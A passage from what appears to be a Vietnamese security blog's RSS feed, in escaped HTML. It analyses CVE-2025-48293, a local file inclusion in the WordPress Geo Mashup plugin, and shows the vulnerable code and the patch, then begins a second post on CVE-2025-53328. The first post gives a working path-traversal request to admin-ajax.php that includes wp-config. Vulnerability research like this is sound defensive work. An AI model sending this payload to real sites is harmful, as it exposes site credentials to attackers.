&lt;strong&gt;không qua bất kỳ kiểm tra/sanitize nào&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Kết quả được truyền vào &lt;code&gt;GeoMashup::locate_template()&lt;/code&gt; rồi dùng &lt;a href=&#34;https://developer.wordpress.org/reference/functions/load_template/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;load_template()&lt;/code&gt;&lt;/a&gt; - khả năng kẻ tấn công kiểm soát đường dẫn file để include.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function generate_object_html( ) {&#xA;    $template_base = ( isset( $_GET[&amp;#39;template&amp;#39;] ) ) ? sanitize_key($_GET[&amp;#39;template&amp;#39;]) : &amp;#39;&amp;#39;;&#xA;    // other logic&#xA;    load_template( GeoMashup::locate_template( $template_base ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/sanitize_key/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;sanitize_key()&lt;/code&gt;&lt;/a&gt; được áp dụng cho &lt;code&gt;template&lt;/code&gt; =&amp;gt; loại bỏ các ký tự không an toàn, ngăn &lt;code&gt;../&lt;/code&gt;, &lt;code&gt;\&lt;/code&gt;, và các ký tự đặc biệt làm giảm nguy cơ &lt;strong&gt;path traversal&lt;/strong&gt; và &lt;strong&gt;LFI&lt;/strong&gt; từ tham số &lt;code&gt;template&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Ta phân tích logic trong &lt;code&gt;GeoMashup::locate_template()&lt;/code&gt; có ảnh hưởng gì đến &lt;code&gt;$template_base&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function locate_template( $template_base ) {&#xA;    $template = locate_template( array(&amp;#34;geo-mashup-$template_base.php&amp;#34;) );&#xA; &#xA;    if ( empty( $template ) || !is_readable( $template ) ) {&#xA;        $template = path_join( GEO_MASHUP_DIR_PATH, &amp;#34;default-templates/$template_base.php&amp;#34; );&#xA;    }&#xA;    return $template;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$template&lt;/code&gt; được gán lại giá trị bằng cách gọi &lt;code&gt;locate_template()&lt;/code&gt; thuộc file &lt;strong&gt;template.php&lt;/strong&gt; với đối số &lt;code&gt;geo-mashup-$template_base.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function locate_template( $template_names, $load = false, $load_once = true, $args = array() ) {&#xA;&#x9;global $wp_stylesheet_path, $wp_template_path;&#xA;&#xA;&#x9;if ( ! isset( $wp_stylesheet_path ) || ! isset( $wp_template_path ) ) {&#xA;&#x9;&#x9;wp_set_template_globals();&#xA;&#x9;}&#xA;&#xA;&#x9;$is_child_theme = is_child_theme();&#xA;&#xA;&#x9;$located = &amp;#39;&amp;#39;;&#xA;&#x9;foreach ( (array) $template_names as $template_name ) {&#xA;&#x9;&#x9;if ( ! $template_name ) {&#xA;&#x9;&#x9;&#x9;continue;&#xA;&#x9;&#x9;}&#xA;&#x9;&#x9;if ( file_exists( $wp_stylesheet_path . &amp;#39;/&amp;#39; . $template_name ) ) {&#xA;&#x9;&#x9;&#x9;$located = $wp_stylesheet_path . &amp;#39;/&amp;#39; . $template_name;&#xA;&#x9;&#x9;&#x9;break;&#xA;&#x9;&#x9;} elseif ( $is_child_theme &amp;amp;&amp;amp; file_exists( $wp_template_path . &amp;#39;/&amp;#39; . $template_name ) ) {&#xA;&#x9;&#x9;&#x9;$located = $wp_template_path . &amp;#39;/&amp;#39; . $template_name;&#xA;&#x9;&#x9;&#x9;break;&#xA;&#x9;&#x9;} elseif ( file_exists( ABSPATH . WPINC . &amp;#39;/theme-compat/&amp;#39; . $template_name ) ) {&#xA;&#x9;&#x9;&#x9;$located = ABSPATH . WPINC . &amp;#39;/theme-compat/&amp;#39; . $template_name;&#xA;&#x9;&#x9;&#x9;break;&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;if ( $load &amp;amp;&amp;amp; &amp;#39;&amp;#39; !== $located ) {&#xA;&#x9;&#x9;load_template( $located, $load_once, $args );&#xA;&#x9;}&#xA;&#xA;&#x9;return $located;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Các logic liên quan đến sự tồn tại của file khi concat với &lt;code&gt;$template_name&lt;/code&gt; được xử lý, nếu không tồn tại thì trả về chuỗi rỗng &lt;code&gt;&#39;&#39;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-13-cve-2025-48293/debug1.png&#34;&#xA;    alt=&#34;Các logic liên quan đến sự tồn tại của file&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Các logic liên quan đến sự tồn tại của file&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Khi attack gửi &lt;code&gt;$_GET[&#39;template&#39;]&lt;/code&gt; chứa &lt;code&gt;../&lt;/code&gt; thì mặc định file luôn không tồn tại, luôn trả về &lt;code&gt;&#39;&#39;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Quay trở lại &lt;code&gt;GeoMashup::locate_template()&lt;/code&gt;, khi &lt;code&gt;$template_name&lt;/code&gt; empty và không tồn tại (&lt;code&gt;!is_readable($template)&lt;/code&gt;) thì được gán lại giá trị và trả về.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;const string GEO_MASHUP_DIR_PATH = &amp;#34;/srv/www/wordpress/wp-content/plugins/geo-mashup&amp;#34;&#xA;&#xA;GEO_MASHUP_DIR_PATH.default-templates/$template_base.php&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 &lt;code&gt;GeoMashup::locate_template()&lt;/code&gt; không ảnh hưởng đến &lt;code&gt;$template_base&lt;/code&gt; do ta kiểm soát, ta tiến hành tìm cách kích hoạt sự kiện này&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ( isset( $_GET[&amp;#39;output&amp;#39;] ) and &amp;#39;json&amp;#39; == $_GET[&amp;#39;output&amp;#39;] ) or empty( $_GET[&amp;#39;object_ids&amp;#39;] ) ) {&#xA;&#x9;GeoMashupQuery::generate_location_json( );&#xA;} else {&#xA;&#x9;GeoMashupQuery::generate_object_html( );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;generate_object_html()&lt;/code&gt; chỉ được gọi khi &lt;code&gt;$_GET[&#39;output&#39;]&lt;/code&gt; không được truyền và &lt;code&gt;$_GET[&#39;object_ids&#39;]&lt;/code&gt; không empty.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;geo-query.php&lt;/strong&gt; chứa logic trên được gọi trong &lt;strong&gt;geo-mashup.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-13-cve-2025-48293/search1.png&#34;&#xA;    alt=&#34;geo-query.php được gọi trong geo-mashup.php&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;&lt;strong&gt;geo-query.php&lt;/strong&gt; được gọi trong &lt;strong&gt;geo-mashup.php&lt;/strong&gt;&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Hàm &lt;code&gt;geo_query&lt;/code&gt; là callback của action hook &lt;strong&gt;Unauthenticated&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_geo_mashup_query&amp;#39;, array( __CLASS__, &amp;#39;geo_query&amp;#39;) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi truy cập endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với param &lt;code&gt;action=geo_mashup_query&lt;/code&gt; thì callback &lt;code&gt;geo_query&lt;/code&gt; được gọi.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Thêm code vào &lt;code&gt;wp-config.php&lt;/code&gt; để thử nghiệm&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;echo &amp;#34;Payload&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Gửi &lt;strong&gt;GET request&lt;/strong&gt; với &lt;strong&gt;LFI&lt;/strong&gt; payload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-ajax.php?action=geo_mashup_query&amp;amp;object_ids=2&amp;amp;template=../../../../wp-config HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: vi,en-US;q=0.7,en;q=0.3&#xA;Accept-Encoding: gzip, deflate, br&#xA;Connection: keep-alive&#xA;Upgrade-Insecure-Requests: 1&#xA;Sec-Fetch-Dest: document&#xA;Sec-Fetch-Mode: navigate&#xA;Sec-Fetch-Site: none&#xA;Sec-Fetch-User: ?1&#xA;X-PwnFox-Color: green&#xA;Priority: u=0, i&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-13-cve-2025-48293/result.png&#34;&#xA;    alt=&#34;Kết quả LFI thành công&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Kết quả LFI thành công&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-48293 là LFI do dùng input &lt;code&gt;template&lt;/code&gt; không kiểm soát khi ghép vào đường dẫn fallback, cho phép path traversal (&lt;code&gt;..&lt;/code&gt;) và include file ngoài dự định. Đã vá trong &lt;strong&gt;v1.13.17&lt;/strong&gt; bằng &lt;code&gt;sanitize_key()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không dùng input user trực tiếp để build path cho include.&lt;/li&gt;&#xA;&lt;li&gt;Dùng &lt;strong&gt;whitelist&lt;/strong&gt; hoặc &lt;code&gt;sanitize_key()&lt;/code&gt; + &lt;code&gt;realpath()&lt;/code&gt; kiểm tra.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/geo-mashup/vulnerability/wordpress-geo-mashup-plugin-1-13-16-local-file-inclusion-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Geo Mashup Plugin &amp;lt;= 1.13.16 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53328 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-12-cve-2025-53328/</link>
      <pubDate>Sun, 12 Oct 2025 19:18:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-12-cve-2025-53328/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-12-cve-2025-53328/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Poll, Survey &amp;amp; Quiz Maker Plugin by Opinion Stage&lt;/strong&gt; phiên bản &lt;strong&gt;≤ 19.11.0&lt;/strong&gt; chứa lỗ hổng &lt;strong&gt;Local File Inclusion (CVE-2025-53328, CVSS 7.5)&lt;/strong&gt; cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh &lt;code&gt;include/require&lt;/code&gt;, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53328&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53328&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 19.11.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 19.11.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/social-polls-by-opinionstage/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Poll, Survey &amp;amp; Quiz Maker Plugin by Opinion Stage Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-important&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 1.75C0 .784.784.0 1.75.0h12.5C15.216.0 16 .784 16 1.75v9.5A1.75 1.75.0 0114.25 13H8.06l-2.573 2.573A1.458 1.458.0 013 14.543V13H1.75A1.75 1.75.0 010 11.25zm1.75-.25a.25.25.0 00-.25.25v9.5c0 .138.112.25.25.25h2a.75.75.0 01.75.75v2.19l2.72-2.72a.749.749.0 01.53-.22h6.5a.25.25.0 00.25-.25v-9.5a.25.25.0 00-.25-.25zm7 2.25v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 9A1 1 0 117 9a1 1 0 012 0z&#34;/&gt;&lt;/svg&gt;Quan trọng&lt;/p&gt;&lt;p&gt;Mặc dù lỗ hổng được công bố là &lt;strong&gt;Unauthenticated&lt;/strong&gt;, trong thực tế việc khai thác đòi hỏi kẻ tấn công có quyền nội bộ tối thiểu — ví dụ tài khoản &lt;strong&gt;Contributor&lt;/strong&gt; hoặc quyền tương đương trên WordPress&lt;/p&gt;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Poll, Survey &amp;amp; Quiz Maker Plugin by Opinion Stage&lt;/strong&gt;: &lt;strong&gt;19.11.0&lt;/strong&gt; (vulnerable) và &lt;strong&gt;19.11.1&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 